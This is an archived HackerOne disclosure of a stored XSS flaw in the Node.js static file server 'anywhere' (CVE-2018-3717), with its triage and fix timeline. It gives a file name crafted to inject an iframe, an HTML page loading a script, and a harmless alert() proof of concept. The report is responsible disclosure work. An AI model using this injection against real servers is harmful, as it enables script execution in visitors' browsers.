---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/cross-site-scripting-xss-stored
  - env/web
  - stack/node
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Stored"
enriched: true
body: true
date: 2018-02-26
submitted: 2018-01-25T22:02:33.743Z
bounty_usd: null
votes: 6
cve: "CVE-2018-3717"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "bl4de"
source: "https://hackerone.com/reports/309394"
title: "[anywhere] An iframe element with url to malicious HTML file (with eg. JavaScript malware) can be used as filename and served via anywhere"
---
# [anywhere] An iframe element with url to malicious HTML file (with eg. JavaScript malware) can be used as filename and served via anywhere

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 6 | **Program:** Node.js third-party modules | **Disclosed:** 2018-02-26

- Report: [https://hackerone.com/reports/309394](https://hackerone.com/reports/309394)
- CWE: Cross-site Scripting (XSS) - Stored | CVE: CVE-2018-3717
- Submitted: 2018-01-25T22:02:33.743Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi Guys,

**anywhere** allows to embed HTML in file names, which (in certain conditions) might lead to execute malicious JavaScript.

**Module:** 

Running static file server anywhere.

https://www.npmjs.com/package/anywhere

**Description**



To embed malicious ```<script>``` tag with JavaScript code to execute, ```/``` character is necessary.
In all operating systems, ```/``` is not allowed as a character used in file name. This means there is very few option to craft an attack using file name as injection point.

## Steps To Reproduce:

However, if attacker wants to, one can still use some tricks and change one of the filenames into something like following example:

```
"><iframe src="malware_frame.html">
```

Then, HTML file with following content have to be saved in the same directory as file with the name changed:

```html
<html>

<head>
    <meta charset="utf8" />
    <title>Frame embeded with malware :P</title>
</head>

<body>
    <p>iframe element with malicious code</p>
    <script type="text/javascript" src="malware.js"></script>
</body>

</html>
```

An ```src``` attribute value I've used here is just for PoC purpose, this can be any external url.
On my local machine, ```malware.js``` has following content:

```javascript
alert('Uh oh, I am very bad malware!')
```

Now, if you run ```anywhere``` in directory where both file with filename changed and ```malware_frame.html``` are saved:

```
$ ./node_modules/anywhere/bin/anywhere -p 8080
Running at http://192.168.1.1:8080/
Also running at https://192.168.1.1:8081/
```

and open ```http://127.0.0.1:8080``` in the browser, you can see JavaScript from ```malware.js``` is executed:

{F257400}

## Supporting Material/References:

Configuration I've used to find this vulnerability:

- macOS HighSierra 10.13.3
- node 8.9.3
- npm 5.5.1
- curl 7.54.0

## Wrap up

I hope this report will help to keep Node ecosystem more safe. If you have any questions about any details of this finding, please let me know in comment.

Thank you

Regards,

Rafal 'bl4de' Janicki

## Impact

Exploitation of this vulnerability in the wild might be hard, however it's not impossible and it depends only on attacker's skills to get into directory on the server, where ```anywhere``` is used to serve static content.

## Timeline

- **Report Filed**
- **2018-01-26** @vdeturckheim: Hey @bl4de , thanks for reporting this. We will look shortly at this report!
- **2018-01-30** @lirantal: Thanks for reporting this issue to us.

I was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.
I will invite the package maintainer to this issue.
- **Report Triaged**
- **Changed Scope**
- **Cve Id Added**
- **Cve Id Added**
- **2018-02-14** @lirantal: Since the author didn't join the report I opened a security issue in the repo.
- **2018-02-18** @lirantal: Author commented on a fix but I invited to take part in the conversation: https://github.com/JacksonTian/anywhere/issues/33#issuecomment-366527448
- **2018-02-19** @bl4de: Looks like changes Author introduced resolved an issue as I can't reproduce one.
- **2018-02-26** @lirantal: So if release 1.5.0 fixes it and we don't have the author joining us I'll go ahead and disclose publicly
- **2018-02-26** @bl4de: @lirantal Sounds good to me. Issue is fixed, so there's no reason not to do so.
- **Report Resolved**
- **Agreed On Going Public**
- **Manually Disclosed**
- **Report Severity Updated**
- **Report Severity Updated**
